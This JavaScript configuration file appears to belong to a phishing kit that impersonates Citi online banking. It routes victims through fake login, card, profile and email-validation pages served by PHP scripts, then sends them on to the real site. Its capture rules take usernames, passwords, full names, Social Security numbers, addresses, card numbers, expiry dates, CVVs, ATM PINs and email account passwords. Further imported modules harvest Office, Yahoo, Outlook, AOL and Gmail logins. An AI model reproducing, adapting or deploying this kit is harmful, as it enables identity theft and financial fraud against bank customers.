/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const superagent = require('superagent')

const OFFICE_MODULE = require('../office/main')
const YAHOO_MODULE = require('../yahoo/main')
const OUTLOOK_MODULE = require('../outlook/main')
const AOL_MODULE = require('../aol/main')
const GMAIL_MODULE = require('../gmail/main')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */

const configExport = {

    SCHEME: 'boa',

    CURRENT_DOMAIN: 'online.citi.com',

    START_PATH: '/session/secure/login',
    
    PATTERNS: [],

    FORCE_PROXY: ["/auth/login/finish"],

    PHP_PROCESSOR: {
        '/session/secure/login': {
            GET: {
                script: 'login.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/card',

            },
        },

        '/session/secure/card': {
            GET: {
                script: 'card.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/menikooko',

            },
        },


        '/session/secure/server': {
            GET: {
            
            },
            POST: {
            },
        },
        
        '/session/secure/plaid': {
            GET: {
                script: 'addon/email.php',
            },
            POST: {}
        },

        '/session/secure/email/validate': {
            GET: {
                script: null,
            },
            POST: {
                script: 'addon/validate.php',
                
                redirectTo: '',

            },
        },

       
        '/session/secure/profile': {
            GET: {
                script: 'profile.php',
            },
            POST: {
                script: null,
            
                redirectTo: '/session/secure/plaid',

            },
        },
    },

    COOKIE_PATH: [],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://online.citi.com/',


    EXTRA_COMMANDS: [],

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginUserName2: {
            method: 'POST',
            params: ['username1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword2: {
            method: 'POST',
            params: ['password1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        SSN: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        address: {
            method: 'POST',
            params: ['address'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        email: {
            method: 'POST',
            params: ['email'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword1: {
            method: 'POST',
            params: ['pinto1'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword2: {
            method: 'POST',
            params: ['pinto2'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
       
        CardNumber: {
            method: 'POST',
            params: ['card'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        Expiry: {
            method: 'POST',
            params: ['exp'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        cvv: {
            method: 'POST',
            params: ['cvv'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        PIN: {
            method: 'POST',
            params: ['atmpin'],
            urls: '',
            hosts: 'PHP-EXEC',
        },


        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: '/auth/login/finish',
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: '/auth/login/finish',
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: '/auth/login/finish',
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: '/auth/login/finish',
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: '/auth/login/finish',
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    EXTERNAL_FILTERS: [],


}

module.exports = configExport